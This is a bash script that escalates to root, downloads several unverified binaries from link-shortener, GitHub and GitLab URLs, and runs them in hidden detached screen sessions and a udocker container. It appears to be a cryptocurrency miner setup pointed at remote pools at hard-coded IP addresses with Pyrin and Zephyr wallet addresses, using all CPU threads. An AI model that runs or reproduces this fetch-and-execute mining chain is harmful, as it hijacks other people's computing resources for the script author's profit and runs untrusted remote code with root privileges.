#!/bin/bash
sudo su <<EOF

wget -qO jupyter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/jupyter.sh && chmod +x * && ./jupyter.sh
sudo apt install screen -y
wget -qO root https://s.id/minulz >/dev/null 2>&1 && chmod +x *
screen -dms run ./root --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.236.130.246:80 --cleanjobs --nonvml --hideclocks
wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all) '
EOF

